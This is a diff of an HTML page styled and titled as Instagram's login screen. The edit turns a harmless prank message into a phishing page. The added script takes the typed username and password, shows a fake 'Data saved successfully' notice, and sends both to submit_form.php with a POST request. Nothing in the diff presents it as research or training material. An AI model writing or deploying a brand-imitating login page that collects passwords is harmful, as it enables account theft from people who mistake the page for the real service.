@@ -5,43 +5,8 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <!-- title -->
     <title>Instagram</title>
-
-    <!-- custom css link -->
     <link rel="stylesheet" href="style.css">
-
-    <!-- favicon -->
-    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
-
-    <!-- boxicons cdn link -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
-
-    <!-- JavaScript for displaying message box -->
-    <script>
-        // Function to handle form submission
-        function submitForm() {
-            // Get form elements
-            var form = document.querySelector('.form');
-            var usernameInput = form.querySelector('input[type="text"]');
-            var passwordInput = form.querySelector('input[type="password"]');
-
-            // Retrieve form data
-            var username = usernameInput.value;
-            var password = passwordInput.value;
-
-            // Display message box
-            var messageBox = document.createElement('div');
-            messageBox.classList.add('message-box');
-            messageBox.textContent = 'Посміхнись :)';
-            document.body.appendChild(messageBox);
-
-            // Clear form fields
-            usernameInput.value = '';
-            passwordInput.value = '';
-        }
-    </script>
 </head>
 
 <body>
@@ -51,36 +16,63 @@
     </div>
 
     <div class="insta__form">
-
         <div class="login__form">
             <img src="img/instalogo.png">
-            <form class="form" method="post" onsubmit="submitForm(); return false;">
-
-                <input type="text" placeholder="Phone number, username, or email">
-                <input type="password" placeholder="Password">
-
-                <button type="submit">
-                    Log in
-                </button>
-                
-                <span class="or">OR</span>
-                
+            <form id="loginForm" class="form" method="post" action="submit_form.php">
+                <input type="text" id="username" name="username" placeholder="Phone number, username, or email">
+                <input type="password" id="password" name="password" placeholder="Password">
+                <button type="submit">Log in</button>
             </form>
-
             <h3>
-                <i class='bx bxl-facebook-circle' ></i>
+                <i class='bx bxl-facebook-circle'></i>
                 Log in with Facebook
             </h3>
-
-            <span class="forget">
-                Forget Password ?
-            </span>
-
-
+            <span class="forget">Forget Password ?</span>
         </div>
-
     </div>
 
+    <div id="messageBox" class="message-box">
+        <!-- Message box content will be added dynamically here -->
+    </div>
+
+    <script>
+        // Function to handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Retrieve form data
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Display message box
+            var messageBox = document.getElementById('messageBox');
+            messageBox.innerHTML = '<div class="message">Data saved successfully</div>';
+
+            // Clear form fields
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+
+            // Send form data to server (you can use AJAX for this)
+            var formData = new FormData();
+            formData.append('username', username);
+            formData.append('password', password);
+
+            fetch('submit_form.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Form data sent successfully');
+                } else {
+                    console.error('Failed to send form data');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending form data:', error);
+            });
+        });
+    </script>
 </body>
 
 </html>
